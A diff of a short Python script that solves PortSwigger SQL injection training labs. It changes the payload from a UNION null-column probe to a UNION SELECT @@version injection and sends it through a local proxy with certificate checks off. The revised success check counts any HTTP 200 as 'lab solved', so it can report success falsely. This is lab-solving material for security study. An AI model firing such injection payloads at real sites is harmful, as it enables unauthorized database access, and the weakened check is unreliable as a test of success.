@@ -1,5 +1,5 @@
-# Lab name: Lab: SQL injection UNION attack, determining the number of columns returned by the query
-# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+# Lab name: Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+# Lab link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
 
 import requests
 import urllib3
@@ -11,7 +11,7 @@ proxies = {
     'http':'http://127.0.0.1:8080', 
     'https':'http://127.0.0.1:8080'
 }
-payload = "'union+select+null,null,null--"
+payload = "'union+SELECT+@@version,null%23"
 
 def filter_url():
     global url
@@ -22,10 +22,9 @@ url = input('Enter lab url: ')
 
 filter_url()
 
-
 response = req.get(url, proxies=proxies, verify=False)
 
-if 'Congratulations, you solved the lab!' in response.text:
+if response.status_code == 200:
     print('Lab solved successfully')
 elif response.status_code == 504:
     print('Lab is not available, please refresh the url')
